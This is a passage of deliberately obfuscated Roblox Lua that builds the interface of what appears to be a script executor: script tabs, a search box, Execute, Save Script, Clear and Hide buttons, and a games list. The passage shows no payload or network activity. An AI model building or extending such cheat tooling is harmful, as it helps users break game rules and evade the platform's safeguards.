v0["39"]['Position'] = UDim2.new(169 - (28 + 141), 25, 0 + 0, 0 - 0);
v0["3a"] = Instance.new("ImageButton", v0["36"]);
v0["3a"]['BackgroundColor3'] = Color3.fromRGB(200, 14 + 5, 1348 - (486 + 831));
v0["3a"]['ImageColor3'] = Color3.fromRGB(196, 196, 509 - 313);
v0["3a"]['AnchorPoint'] = Vector2.new(1, 0.5 - 0);
v0["3a"]['Image'] = [[rbxassetid://7681033210]];
v0["3a"]['Size'] = UDim2.new(0 + 0, 56 - 38, 1263 - (668 + 595), 18);
v0["3a"]['Name'] = [[Delete]];
v0["3a"]['Position'] = UDim2.new(1 + 0, 0 + 0, 0.5 - 0, 290 - (23 + 267));
v0["3a"]['BackgroundTransparency'] = 1945 - (1129 + 815);
v0["3b"] = Instance.new("ImageLabel", v0["33"]);
v0["3b"]['ZIndex'] = 2;
v0["3b"]['SliceCenter'] = Rect.new(100, 487 - (371 + 16), 1850 - (1326 + 424), 189 - 89);
v0["3b"]['ScaleType'] = Enum.ScaleType.Slice;
v0["3b"]['BackgroundColor3'] = Color3.fromRGB(0 - 0, 118 - (88 + 30), 0);
v0["3b"]['ImageColor3'] = Color3.fromRGB(0, 771 - (720 + 51), 0 - 0);
v0["3b"]['SliceScale'] = 1776.050000000745 - (421 + 1355);
v0["3b"]['Selectable'] = true;
v0["3b"]['Image'] = [[rbxassetid://3570695787]];
v0["3b"]['Size'] = UDim2.new(0 - 0, 52 + 52, 1083 - (286 + 797), 83 - 60);
v0["3b"]['Active'] = true;
v0["3b"]['BorderColor3'] = Color3.fromRGB(421 - 166, 255, 694 - (397 + 42));
v0["3b"]['Name'] = [[TextBox]];
v0["3b"]['Position'] = UDim2.new(0 + 0, 800 - (24 + 776), 0 - 0, -30);
v0["3c"] = Instance.new("TextBox", v0["3b"]);
v0["3c"]['PlaceholderColor3'] = Color3.fromRGB(911 - (222 + 563), 277 - 151, 91 + 35);
v0["3c"]['ZIndex'] = 192 - (23 + 167);
v0["3c"]['BorderSizePixel'] = 0;
v0["3c"]['TextColor3'] = Color3.fromRGB(1969 - (690 + 1108), 171, 171);
v0["3c"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["3c"]['TextWrapped'] = true;
v0["3c"]['TextTruncate'] = Enum.TextTruncate.AtEnd;
v0["3c"]['TextSize'] = 6 + 10;
v0["3c"]['BackgroundColor3'] = Color3.fromRGB(0 + 0, 0, 848 - (40 + 808));
v0["3c"]['AnchorPoint'] = Vector2.new(0.5, 0.5 + 0);
v0["3c"]['PlaceholderText'] = [[Search..]];
v0["3c"]['Size'] = UDim2.new(0, 88, 0 - 0, 22 + 1);
v0["3c"]['BorderColor3'] = Color3.fromRGB(135 + 120, 66 + 54, 571 - (47 + 524));
v0["3c"]['Text'] = [[]];
v0["3c"]['Position'] = UDim2.new(0.45694321393966675 + 0, 0 - 0, 0.5 - 0, 0 - 0);
v0["3c"]['Font'] = Enum.Font.SourceSans;
v0["3c"]['ClearTextOnFocus'] = false;
v0["3d"] = Instance.new("ImageLabel", v0["3b"]);
v0["3d"]['ZIndex'] = 1728 - (1165 + 561);
v0["3d"]['ScaleType'] = Enum.ScaleType.Fit;
v0["3d"]['BackgroundColor3'] = Color3.fromRGB(8 + 247, 789 - 534, 98 + 157);
v0["3d"]['AnchorPoint'] = Vector2.new(480 - (341 + 138), 0.5 + 0);
v0["3d"]['Image'] = [[rbxassetid://3605509925]];
v0["3d"]['Size'] = UDim2.new(0, 17, 0 - 0, 343 - (89 + 237));
v0["3d"]['BorderColor3'] = Color3.fromRGB(231, 820 - 565, 0 - 0);
v0["3d"]['BackgroundTransparency'] = 882 - (581 + 300);
v0["3d"]['Position'] = UDim2.new(1221 - (855 + 365), 0 - 0, 0.5 + 0, 1235 - (1030 + 205));
v0["3e"] = Instance.new("LocalScript", v0["3b"]);
v0["3e"]['Name'] = [[handler]];
v0["3f"] = Instance.new("Frame", v0["28"]);
v0["3f"]['ZIndex'] = 2 + 0;
v0["3f"]['BackgroundColor3'] = Color3.fromRGB(238 + 17, 255, 541 - (156 + 130));
v0["3f"]['AnchorPoint'] = Vector2.new(0 - 0, 1 - 0);
v0["3f"]['BackgroundTransparency'] = 1 - 0;
v0["3f"]['Size'] = UDim2.new(1 + 0, -(76 + 53), 0, 93 - (10 + 59));
v0["3f"]['Position'] = UDim2.new(0 + 0, 49 - 39, 1, -8);
v0["3f"]['Name'] = [[BottomButtons]];
v0["40"] = Instance.new("UIListLayout", v0["3f"]);
v0["40"]['VerticalAlignment'] = Enum.VerticalAlignment.Center;
v0["40"]['FillDirection'] = Enum.FillDirection.Horizontal;
v0["40"]['Padding'] = UDim.new(1163 - (671 + 492), 4 + 1);
v0["40"]['SortOrder'] = Enum.SortOrder.LayoutOrder;
v0["41"] = Instance.new("ImageButton", v0["3f"]);
v0["41"]['Active'] = false;
v0["41"]['ZIndex'] = 2;
v0["41"]['SliceCenter'] = Rect.new(1315 - (369 + 846), 100, 27 + 73, 86 + 14);
v0["41"]['ScaleType'] = Enum.ScaleType.Slice;
v0["41"]['SliceScale'] = 0.029999999329447746;
v0["41"]['BackgroundColor3'] = Color3.fromRGB(2200 - (1036 + 909), 203 + 52, 255);
v0["41"]['ImageColor3'] = Color3.fromRGB(26, 43 - 17, 229 - (11 + 192));
v0["41"]['Selectable'] = false;
v0["41"]['LayoutOrder'] = 1 + 0;
v0["41"]['Image'] = [[rbxassetid://3570695787]];
v0["41"]['Size'] = UDim2.new(175 - (135 + 40), 259 - 152, 0 + 0, 24);
v0["41"]['Name'] = [[ClearBtn]];
v0["41"]['Position'] = UDim2.new(0 - 0, 0 - 0, -1.5833333730697632, 0);
v0["41"]['BackgroundTransparency'] = 1;
v0["42"] = Instance.new("ImageButton", v0["41"]);
v0["42"]['ZIndex'] = 178 - (50 + 126);
v0["42"]['BackgroundColor3'] = Color3.fromRGB(709 - 454, 57 + 198, 1668 - (1233 + 180));
v0["42"]['ImageColor3'] = Color3.fromRGB(1140 - (522 + 447), 1592 - (107 + 1314), 80 + 91);
v0["42"]['AnchorPoint'] = Vector2.new(0, 0.5);
v0["42"]['Image'] = [[http://www.roblox.com/asset/?id=6022668885]];
v0["42"]['Size'] = UDim2.new(0 - 0, 24, 0 + 0, 47 - 23);
v0["42"]['Position'] = UDim2.new(0.023000000044703484 - 0, 1910 - (716 + 1194), 0.5 + 0, 0);
v0["42"]['BackgroundTransparency'] = 1 + 0;
v0["43"] = Instance.new("TextButton", v0["41"]);
v0["43"]['TextWrapped'] = true;
v0["43"]['Active'] = false;
v0["43"]['ZIndex'] = 505 - (74 + 429);
v0["43"]['TextSize'] = 18;
v0["43"]['BackgroundColor3'] = Color3.fromRGB(491 - 236, 255, 127 + 128);
v0["43"]['TextColor3'] = Color3.fromRGB(391 - 220, 121 + 50, 527 - 356);
v0["43"]['Selectable'] = false;
v0["43"]['AnchorPoint'] = Vector2.new(0 - 0, 433.5 - (279 + 154));
v0["43"]['Size'] = UDim2.new(1, -(818 - (454 + 324)), 1 + 0, 17 - (12 + 5));
v0["43"]['Name'] = [[TextLabel]];
v0["43"]['Text'] = [[Clear]];
v0["43"]['Font'] = Enum.Font.SourceSans;
v0["43"]['Position'] = UDim2.new(0 + 0, 76 - 46, 0.5 + 0, 1093 - (277 + 816));
v0["43"]['BackgroundTransparency'] = 4 - 3;
v0["44"] = Instance.new("TextButton", v0["41"]);
v0["44"]['ZIndex'] = 3;
v0["44"]['TextSize'] = 1197 - (1058 + 125);
v0["44"]['TextTransparency'] = 1;
v0["44"]['BackgroundColor3'] = Color3.fromRGB(48 + 207, 1230 - (815 + 160), 1094 - 839);
v0["44"]['TextColor3'] = Color3.fromRGB(0 - 0, 0 + 0, 0);
v0["44"]['Size'] = UDim2.new(1, 0 - 0, 1, 1898 - (41 + 1857));
v0["44"]['Name'] = [[Hitbox]];
v0["44"]['Text'] = [[]];
v0["44"]['Font'] = Enum.Font.SourceSans;
v0["44"]['BackgroundTransparency'] = 1894 - (1222 + 671);
v0["45"] = Instance.new("LocalScript", v0["41"]);
v0["45"]['Name'] = [[handler]];
v0["46"] = Instance.new("ImageButton", v0["3f"]);
v0["46"]['Active'] = false;
v0["46"]['ZIndex'] = 5 - 3;
v0["46"]['SliceCenter'] = Rect.new(143 - 43, 100, 1282 - (229 + 953), 1874 - (1111 + 663));
v0["46"]['ScaleType'] = Enum.ScaleType.Slice;
v0["46"]['SliceScale'] = 1579.0299999993294 - (874 + 705);
v0["46"]['BackgroundColor3'] = Color3.fromRGB(36 + 219, 255, 174 + 81);
v0["46"]['ImageColor3'] = Color3.fromRGB(26, 26, 53 - 27);
v0["46"]['Selectable'] = false;
v0["46"]['LayoutOrder'] = 1 + 2;
v0["46"]['Image'] = [[rbxassetid://3570695787]];
v0["46"]['Size'] = UDim2.new(679 - (642 + 37), 107, 0, 24);
v0["46"]['Name'] = [[SaveBtn]];
v0["46"]['Position'] = UDim2.new(0 + 0, 0, -(1.5833333730697632 + 0), 0 - 0);
v0["46"]['BackgroundTransparency'] = 455 - (233 + 221);
v0["47"] = Instance.new("ImageButton", v0["46"]);
v0["47"]['ZIndex'] = 2;
v0["47"]['BackgroundColor3'] = Color3.fromRGB(255, 589 - 334, 255);
v0["47"]['ImageColor3'] = Color3.fromRGB(151 + 20, 171, 1712 - (718 + 823));
v0["47"]['AnchorPoint'] = Vector2.new(0 + 0, 0.5);
v0["47"]['Image'] = [[http://www.roblox.com/asset/?id=6035067857]];
v0["47"]['Size'] = UDim2.new(805 - (266 + 539), 67 - 43, 1225 - (636 + 589), 56 - 32);
v0["47"]['Position'] = UDim2.new(0.023000000044703484 - 0, 0, 0.5 + 0, 0 + 0);
v0["47"]['BackgroundTransparency'] = 1;
v0["48"] = Instance.new("TextButton", v0["46"]);
v0["48"]['TextWrapped'] = true;
v0["48"]['Active'] = false;
v0["48"]['ZIndex'] = 1017 - (657 + 358);
v0["48"]['TextSize'] = 47 - 29;
v0["48"]['BackgroundColor3'] = Color3.fromRGB(580 - 325, 255, 1442 - (1151 + 36));
v0["48"]['TextColor3'] = Color3.fromRGB(171, 166 + 5, 45 + 126);
v0["48"]['Selectable'] = false;
v0["48"]['AnchorPoint'] = Vector2.new(0, 0.5 - 0);
v0["48"]['Size'] = UDim2.new(1833 - (1552 + 280), -40, 1, 0);
v0["48"]['Name'] = [[TextLabel]];
v0["48"]['Text'] = [[Save Script]];
v0["48"]['Font'] = Enum.Font.SourceSans;
v0["48"]['Position'] = UDim2.new(834 - (64 + 770), 30, 0.5, 0 + 0);
v0["48"]['BackgroundTransparency'] = 2 - 1;
v0["49"] = Instance.new("TextButton", v0["46"]);
v0["49"]['ZIndex'] = 1 + 2;
v0["49"]['TextSize'] = 1257 - (157 + 1086);
v0["49"]['TextTransparency'] = 1;
v0["49"]['BackgroundColor3'] = Color3.fromRGB(255, 510 - 255, 1116 - 861);
v0["49"]['TextColor3'] = Color3.fromRGB(0 - 0, 0 - 0, 0);
v0["49"]['Size'] = UDim2.new(820 - (599 + 220), 0 - 0, 1932 - (1813 + 118), 0 + 0);
v0["49"]['Name'] = [[Hitbox]];
v0["49"]['Text'] = [[]];
v0["49"]['Font'] = Enum.Font.SourceSans;
v0["49"]['BackgroundTransparency'] = 1218 - (841 + 376);
v0["4a"] = Instance.new("LocalScript", v0["46"]);
v0["4a"]['Name'] = [[handler]];
v0["4b"] = Instance.new("ImageButton", v0["3f"]);
v0["4b"]['Active'] = false;
v0["4b"]['ZIndex'] = 2 - 0;
v0["4b"]['SliceCenter'] = Rect.new(24 + 76, 272 - 172, 100, 959 - (464 + 395));
v0["4b"]['ScaleType'] = Enum.ScaleType.Slice;
v0["4b"]['SliceScale'] = 0.029999999329447746 - 0;
v0["4b"]['BackgroundColor3'] = Color3.fromRGB(123 + 132, 1092 - (467 + 370), 255);
v0["4b"]['ImageColor3'] = Color3.fromRGB(53 - 27, 20 + 6, 89 - 63);
v0["4b"]['Selectable'] = false;
v0["4b"]['LayoutOrder'] = 1 + 2;
v0["4b"]['Image'] = [[rbxassetid://3570695787]];
v0["4b"]['Size'] = UDim2.new(0 - 0, 627 - (150 + 370), 0, 24);
v0["4b"]['Name'] = [[HideBtn]];
v0["4b"]['Position'] = UDim2.new(1282 - (74 + 1208), 0 - 0, -1.5833333730697632, 0 - 0);
v0["4b"]['BackgroundTransparency'] = 1;
v0["4c"] = Instance.new("ImageButton", v0["4b"]);
v0["4c"]['ZIndex'] = 2 + 0;
v0["4c"]['BackgroundColor3'] = Color3.fromRGB(645 - (14 + 376), 255, 255);
v0["4c"]['ImageColor3'] = Color3.fromRGB(171, 171, 171);
v0["4c"]['AnchorPoint'] = Vector2.new(0 - 0, 0.5 + 0);
v0["4c"]['Image'] = [[http://www.roblox.com/asset/?id=6031075929]];
v0["4c"]['Size'] = UDim2.new(0, 22 + 2, 0, 23 + 1);
v0["4c"]['Position'] = UDim2.new(0.023000000044703484, 0, 0.5 - 0, 0);
v0["4c"]['BackgroundTransparency'] = 1 + 0;
v0["4d"] = Instance.new("TextButton", v0["4b"]);
v0["4d"]['TextWrapped'] = true;
v0["4d"]['Active'] = false;
v0["4d"]['ZIndex'] = 80 - (23 + 55);
v0["4d"]['TextSize'] = 42 - 24;
v0["4d"]['BackgroundColor3'] = Color3.fromRGB(171 + 84, 229 + 26, 255);
v0["4d"]['TextColor3'] = Color3.fromRGB(171, 171, 171);
v0["4d"]['Selectable'] = false;
v0["4d"]['AnchorPoint'] = Vector2.new(0 - 0, 0.5 + 0);
v0["4d"]['Size'] = UDim2.new(1, -40, 1, 901 - (652 + 249));
v0["4d"]['Name'] = [[TextLabel]];
v0["4d"]['Text'] = [[Hide]];
v0["4d"]['Font'] = Enum.Font.SourceSans;
v0["4d"]['Position'] = UDim2.new(0, 30, 0.5 - 0, 0);
v0["4d"]['BackgroundTransparency'] = 1869 - (708 + 1160);
v0["4e"] = Instance.new("TextButton", v0["4b"]);
v0["4e"]['ZIndex'] = 3;
v0["4e"]['TextSize'] = 37 - 23;
v0["4e"]['TextTransparency'] = 1 - 0;
v0["4e"]['BackgroundColor3'] = Color3.fromRGB(282 - (10 + 17), 58 + 197, 1987 - (1400 + 332));
v0["4e"]['TextColor3'] = Color3.fromRGB(0 - 0, 1908 - (242 + 1666), 0);
v0["4e"]['Size'] = UDim2.new(1 + 0, 0, 1, 0 + 0);
v0["4e"]['Name'] = [[Hitbox]];
v0["4e"]['Text'] = [[]];
v0["4e"]['Font'] = Enum.Font.SourceSans;
v0["4e"]['BackgroundTransparency'] = 1;
v0["4f"] = Instance.new("LocalScript", v0["4b"]);
v0["4f"]['Name'] = [[handler]];
v0["50"] = Instance.new("ImageButton", v0["3f"]);
v0["50"]['ZIndex'] = 2 + 0;
v0["50"]['BorderSizePixel'] = 940 - (850 + 90);
v0["50"]['SliceCenter'] = Rect.new(175 - 75, 1490 - (360 + 1030), 89 + 11, 282 - 182);
v0["50"]['ScaleType'] = Enum.ScaleType.Slice;
v0["50"]['Modal'] = true;
v0["50"]['SliceScale'] = 0.029999999329447746 - 0;
v0["50"]['BackgroundColor3'] = Color3.fromRGB(255, 1916 - (909 + 752), 1478 - (109 + 1114));
v0["50"]['ImageColor3'] = Color3.fromRGB(47 - 21, 11 + 15, 268 - (6 + 236));
v0["50"]['Selectable'] = false;
v0["50"]['Image'] = [[rbxassetid://3570695787]];
v0["50"]['Size'] = UDim2.new(0, 68 + 39, 0 + 0, 56 - 32);
v0["50"]['Name'] = [[ExecuteBtn]];
v0["50"]['Position'] = UDim2.new(0, 0 - 0, -(1134.5833333730698 - (1076 + 57)), 0 + 0);
v0["50"]['BackgroundTransparency'] = 1;
v0["51"] = Instance.new("ImageButton", v0["50"]);
v0["51"]['ZIndex'] = 691 - (579 + 110);
v0["51"]['BackgroundColor3'] = Color3.fromRGB(21 + 234, 226 + 29, 255);
v0["51"]['ImageColor3'] = Color3.fromRGB(91 + 80, 578 - (174 + 233), 477 - 306);
v0["51"]['AnchorPoint'] = Vector2.new(0 - 0, 0.5 + 0);
v0["51"]['Image'] = [[http://www.roblox.com/asset/?id=6026663699]];
v0["51"]['Size'] = UDim2.new(1174 - (663 + 511), 22 + 2, 0, 6 + 18);
v0["51"]['Position'] = UDim2.new(0.022900763899087906 - 0, 0, 0.5 + 0, 0 - 0);
v0["51"]['BackgroundTransparency'] = 2 - 1;
v0["52"] = Instance.new("LocalScript", v0["50"]);
v0["53"] = Instance.new("TextButton", v0["50"]);
v0["53"]['TextWrapped'] = true;
v0["53"]['Active'] = false;
v0["53"]['ZIndex'] = 1 + 1;
v0["53"]['TextSize'] = 18;
v0["53"]['BackgroundColor3'] = Color3.fromRGB(496 - 241, 182 + 73, 255);
v0["53"]['TextColor3'] = Color3.fromRGB(16 + 155, 171, 171);
v0["53"]['Selectable'] = false;
v0["53"]['AnchorPoint'] = Vector2.new(722 - (478 + 244), 0.5);
v0["53"]['Size'] = UDim2.new(518 - (440 + 77), -40, 1 + 0, 0 - 0);
v0["53"]['Name'] = [[TextLabel]];
v0["53"]['Text'] = [[Execute]];
v0["53"]['Font'] = Enum.Font.SourceSans;
v0["53"]['Position'] = UDim2.new(1556 - (655 + 901), 6 + 24, 0.5, 0);
v0["53"]['BackgroundTransparency'] = 1 + 0;
v0["54"] = Instance.new("TextButton", v0["50"]);
v0["54"]['ZIndex'] = 3;
v0["54"]['TextSize'] = 10 + 4;
v0["54"]['TextTransparency'] = 3 - 2;
v0["54"]['BackgroundColor3'] = Color3.fromRGB(1700 - (695 + 750), 870 - 615, 393 - 138);
v0["54"]['TextColor3'] = Color3.fromRGB(0 - 0, 0, 351 - (285 + 66));
v0["54"]['Size'] = UDim2.new(2 - 1, 1310 - (682 + 628), 1 + 0, 299 - (176 + 123));
v0["54"]['Name'] = [[Hitbox]];
v0["54"]['Text'] = [[]];
v0["54"]['Font'] = Enum.Font.SourceSans;
v0["54"]['BackgroundTransparency'] = 1 + 0;
v0["55"] = Instance.new("LocalScript", v0["3f"]);
v0["55"]['Name'] = [[handler]];
v0["56"] = Instance.new("ScrollingFrame", v0["28"]);
v0["56"]['Active'] = true;
v0["56"]['BorderSizePixel'] = 0 + 0;
v0["56"]['CanvasSize'] = UDim2.new(0, 0, 0, 269 - (239 + 30));
v0["56"]['BackgroundColor3'] = Color3.fromRGB(70 + 185, 255, 255);
v0["56"]['BackgroundTransparency'] = 1;
v0["56"]['Size'] = UDim2.new(1, -130, 0, 29);
v0["56"]['ScrollBarImageColor3'] = Color3.fromRGB(162 + 6, 168, 297 - 129);
v0["56"]['ScrollBarThickness'] = 8 - 5;
v0["56"]['Position'] = UDim2.new(315 - (306 + 9), 34 - 24, 0 + 0, 4 + 1);
v0["56"]['Name'] = [[OpenScripts]];
v0["57"] = Instance.new("UIListLayout", v0["56"]);
v0["57"]['VerticalAlignment'] = Enum.VerticalAlignment.Center;
v0["57"]['FillDirection'] = Enum.FillDirection.Horizontal;
v0["57"]['Padding'] = UDim.new(0 + 0, 14 - 9);
v0["58"] = Instance.new("ImageButton", v0["56"]);
v0["58"]['Active'] = false;
v0["58"]['ZIndex'] = 1377 - (1140 + 235);
v0["58"]['SliceCenter'] = Rect.new(64 + 36, 100, 92 + 8, 26 + 74);
v0["58"]['ScaleType'] = Enum.ScaleType.Slice;
v0["58"]['SliceScale'] = 0.029999999329447746;
v0["58"]['BackgroundColor3'] = Color3.fromRGB(26, 78 - (33 + 19), 10 + 16);
v0["58"]['ImageColor3'] = Color3.fromRGB(77 - 51, 12 + 14, 50 - 24);
v0["58"]['Selectable'] = false;
v0["58"]['LayoutOrder'] = 469 + 31;
v0["58"]['Image'] = [[rbxassetid://3570695787]];
v0["58"]['Size'] = UDim2.new(0, 713 - (586 + 103), 0 + 0, 22);
v0["58"]['Name'] = [[999]];
v0["58"]['Position'] = UDim2.new(0.1694599688053131 - 0, 1488 - (1309 + 179), 0 - 0, 0);
v0["58"]['BackgroundTransparency'] = 1 + 0;
v0["59"] = Instance.new("TextButton", v0["58"]);
v0["59"]['TextWrapped'] = true;
v0["59"]['Active'] = false;
v0["59"]['ZIndex'] = 5 - 3;
v0["59"]['TextSize'] = 11 + 3;
v0["59"]['TextScaled'] = true;
v0["59"]['BackgroundColor3'] = Color3.fromRGB(541 - 286, 255, 508 - 253);
v0["59"]['TextColor3'] = Color3.fromRGB(831 - (295 + 314), 545 - 323, 2184 - (1300 + 662));
v0["59"]['Selectable'] = false;
v0["59"]['Size'] = UDim2.new(3 - 2, 0, 1756 - (1178 + 577), 0);
v0["59"]['Name'] = [[Hitbox]];
v0["59"]['Text'] = [[+]];
v0["59"]['Font'] = Enum.Font.SourceSans;
v0["59"]['BackgroundTransparency'] = 1;
v0["5a"] = Instance.new("ImageButton", v0["56"]);
v0["5a"]['Active'] = false;
v0["5a"]['ZIndex'] = 2 + 0;
v0["5a"]['SliceCenter'] = Rect.new(295 - 195, 1505 - (851 + 554), 89 + 11, 277 - 177);
v0["5a"]['ScaleType'] = Enum.ScaleType.Slice;
v0["5a"]['SliceScale'] = 0.029999999329447746 - 0;
v0["5a"]['BackgroundColor3'] = Color3.fromRGB(26, 26, 26);
v0["5a"]['ImageColor3'] = Color3.fromRGB(26, 26, 328 - (115 + 187));
v0["5a"]['Selectable'] = false;
v0["5a"]['Image'] = [[rbxassetid://3570695787]];
v0["5a"]['Size'] = UDim2.new(0, 66 + 20, 0 + 0, 86 - 64);
v0["5a"]['Name'] = [[1]];
v0["5a"]['BackgroundTransparency'] = 1;
v0["5b"] = Instance.new("TextButton", v0["5a"]);
v0["5b"]['Active'] = false;
v0["5b"]['ZIndex'] = 1163 - (160 + 1001);
v0["5b"]['TextSize'] = 14 + 1;
v0["5b"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["5b"]['BackgroundColor3'] = Color3.fromRGB(176 + 79, 522 - 267, 613 - (237 + 121));
v0["5b"]['TextColor3'] = Color3.fromRGB(1119 - (525 + 372), 420 - 198, 222);
v0["5b"]['Selectable'] = false;
v0["5b"]['Size'] = UDim2.new(0.6395349502563477 - 0, 142 - (96 + 46), 778 - (643 + 134), 0);
v0["5b"]['Name'] = [[Text]];
v0["5b"]['Text'] = [[Script 1]];
v0["5b"]['Font'] = Enum.Font.SourceSansBold;
v0["5b"]['Position'] = UDim2.new(0.151162788271904 + 0, 0 - 0, 0 - 0, 0 + 0);
v0["5b"]['BackgroundTransparency'] = 1;
v0["5c"] = Instance.new("TextButton", v0["5a"]);
v0["5c"]['ZIndex'] = 10;
v0["5c"]['TextSize'] = 31 - 15;
v0["5c"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["5c"]['TextColor3'] = Color3.fromRGB(126 - 64, 62, 781 - (316 + 403));
v0["5c"]['AnchorPoint'] = Vector2.new(1, 0.5 + 0);
v0["5c"]['Size'] = UDim2.new(0 - 0, 8 + 12, 0 - 0, 20);
v0["5c"]['Name'] = [[X]];
v0["5c"]['Text'] = [[x]];
v0["5c"]['Font'] = Enum.Font.SourceSans;
v0["5c"]['Position'] = UDim2.new(1, 0 + 0, 0.5 + 0, 0);
v0["5c"]['BackgroundTransparency'] = 3 - 2;
v0["5d"] = Instance.new("TextButton", v0["5a"]);
v0["5d"]['ZIndex'] = 14 - 11;
v0["5d"]['TextSize'] = 28 - 14;
v0["5d"]['TextTransparency'] = 1;
v0["5d"]['BackgroundColor3'] = Color3.fromRGB(15 + 240, 502 - 247, 13 + 242);
v0["5d"]['TextColor3'] = Color3.fromRGB(0 - 0, 17 - (12 + 5), 0 - 0);
v0["5d"]['Size'] = UDim2.new(1 - 0, 0, 1 - 0, 0 - 0);
v0["5d"]['Name'] = [[Hitbox]];
v0["5d"]['Text'] = [[]];
v0["5d"]['Font'] = Enum.Font.SourceSans;
v0["5d"]['BackgroundTransparency'] = 1 + 0;
v0["5e"] = Instance.new("ImageLabel", v0["23"]);
v0["5e"]['ZIndex'] = 0;
v0["5e"]['SliceCenter'] = Rect.new(2073 - (1656 + 317), 90 + 10, 81 + 19, 265 - 165);
v0["5e"]['ScaleType'] = Enum.ScaleType.Slice;
v0["5e"]['BackgroundColor3'] = Color3.fromRGB(0 - 0, 354 - (5 + 349), 0 - 0);
v0["5e"]['ImageColor3'] = Color3.fromRGB(1271 - (266 + 1005), 0 + 0, 0);
v0["5e"]['SliceScale'] = 0.029999999329447746;
v0["5e"]['Visible'] = false;
v0["5e"]['Image'] = [[rbxassetid://3570695787]];
v0["5e"]['Size'] = UDim2.new(3 - 2, 0 - 0, 1697 - (561 + 1135), 0);
v0["5e"]['Name'] = [[Games]];
v0["5e"]['BackgroundTransparency'] = 1 - 0;
v0["5e"]['Position'] = UDim2.new(0.00032929747248999774 - 0, 0, -(1066.002999985125 - (507 + 559)), 0);
v0["5f"] = Instance.new("Frame", v0["5e"]);
v0["5f"]['ZIndex'] = 0;
v0["5f"]['BackgroundColor3'] = Color3.fromRGB(639 - 384, 788 - 533, 255);
v0["5f"]['AnchorPoint'] = Vector2.new(388.5 - (212 + 176), 0.5);
v0["5f"]['BackgroundTransparency'] = 906 - (250 + 655);
v0["5f"]['LayoutOrder'] = 13 - 8;
v0["5f"]['Size'] = UDim2.new(1, 0 - 0, 1 - 0, 1956 - (1869 + 87));
v0["5f"]['Position'] = UDim2.new(0.5 - 0, 0, 1901.5 - (484 + 1417), 0 - 0);
v0["5f"]['Name'] = [[InnerBody]];
v0["60"] = Instance.new("TextLabel", v0["5f"]);
v0["60"]['BackgroundColor3'] = Color3.fromRGB(426 - 171, 1028 - (48 + 725), 416 - 161);
v0["60"]['TextSize'] = 61 - 38;
v0["60"]['TextColor3'] = Color3.fromRGB(233, 233, 136 + 97);
v0["60"]['Size'] = UDim2.new(0 - 0, 28 + 72, 0 + 0, 893 - (152 + 701));
v0["60"]['Text'] = [[Games]];
v0["60"]['Name'] = [[Title]];
v0["60"]['Font'] = Enum.Font.SourceSansBold;
v0["60"]['BackgroundTransparency'] = 1;
v0["61"] = Instance.new("ScrollingFrame", v0["5f"]);
v0["61"]['Active'] = true;
v0["61"]['BorderSizePixel'] = 1311 - (430 + 881);
v0["61"]['CanvasSize'] = UDim2.new(0 + 0, 895 - (557 + 338), 0 + 0, 0 - 0);
v0["61"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 892 - 637);
v0["61"]['BackgroundTransparency'] = 1;
v0["61"]['Size'] = UDim2.new(1, 0 - 0, 2 - 1, -(841 - (499 + 302)));
v0["61"]['ScrollBarImageColor3'] = Color3.fromRGB(1034 - (39 + 827), 463 - 295, 374 - 206);
v0["61"]['ScrollBarThickness'] = 19 - 14;
v0["61"]['Position'] = UDim2.new(0, 0 - 0, 0 + 0, 117 - 77);
v0["62"] = Instance.new("UIListLayout", v0["61"]);
v0["62"]['HorizontalAlignment'] = Enum.HorizontalAlignment.Center;
v0["62"]['Padding'] = UDim.new(0 + 0, 7 - 2);
v0["62"]['SortOrder'] = Enum.SortOrder.LayoutOrder;
v0["63"] = Instance.new("Frame", v0["61"]);
v0["63"]['BackgroundColor3'] = Color3.fromRGB(142 - (103 + 1), 592 - (475 + 79), 81 - 43);
v0["63"]['AnchorPoint'] = Vector2.new(1, 0);
v0["63"]['LayoutOrder'] = 3 - 2;
v0["63"]['Size'] = UDim2.new(1 + 0, -(45 + 5), 0, 100);
v0["63"]['Name'] = [[dummy]];
v0["64"] = Instance.new("UICorner", v0["63"]);
v0["65"] = Instance.new("ImageLabel", v0["63"]);
v0["65"]['ScaleType'] = Enum.ScaleType.Crop;
v0["65"]['BackgroundColor3'] = Color3.fromRGB(255, 1758 - (1395 + 108), 742 - 487);
v0["65"]['Image'] = [[rbxassetid://7007977848]];
v0["65"]['Size'] = UDim2.new(0, 120, 0, 1304 - (7 + 1197));
v0["65"]['Name'] = [[GameIcon]];
v0["65"]['BackgroundTransparency'] = 1 + 0;
v0["66"] = Instance.new("UICorner", v0["65"]);
v0["67"] = Instance.new("Frame", v0["65"]);
v0["67"]['BorderSizePixel'] = 0 + 0;
v0["67"]['BackgroundColor3'] = Color3.fromRGB(38, 38, 357 - (27 + 292));
v0["67"]['AnchorPoint'] = Vector2.new(2 - 1, 0);
v0["67"]['Size'] = UDim2.new(0, 5, 1 - 0, 0 - 0);
v0["67"]['Position'] = UDim2.new(1 - 0, 0, 0, 0 - 0);
v0["67"]['Name'] = [[fix]];
v0["68"] = Instance.new("UIGradient", v0["67"]);
v0["68"]['Rotation'] = 229 - (43 + 96);
v0["68"]['Color'] = ColorSequence.new({ColorSequenceKeypoint.new(0 - 0, Color3.fromRGB(140 + 28, 48 + 120, 168)),ColorSequenceKeypoint.new(1, Color3.fromRGB(504 - 249, 255, 255))});
v0["69"] = Instance.new("UIGradient", v0["63"]);
v0["69"]['Rotation'] = 90;
v0["69"]['Color'] = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(168, 314 - 146, 168)),ColorSequenceKeypoint.new(1, Color3.fromRGB(19 + 236, 2006 - (1414 + 337), 255))});
v0["6a"] = Instance.new("TextLabel", v0["63"]);
v0["6a"]['TextWrapped'] = true;
v0["6a"]['TextXAlignment'] = Enum.TextXAlignment.Left;
v0["6a"]['BackgroundColor3'] = Color3.fromRGB(2195 - (1642 + 298), 664 - 409, 733 - 478);
v0["6a"]['TextSize'] = 67 - 44;
v0["6a"]['TextColor3'] = Color3.fromRGB(77 + 156, 233, 182 + 51);
v0["6a"]['Size'] = UDim2.new(973 - (357 + 615), -(127 + 53), 0 - 0, 35 + 5);
v0["6a"]['Text'] = [[GameName]];
v0["6a"]['Name'] = [[Title]];
v0["6a"]['Font'] = Enum.Font.SourceSansBold;
v0["6a"]['BackgroundTransparency'] = 2 - 1;
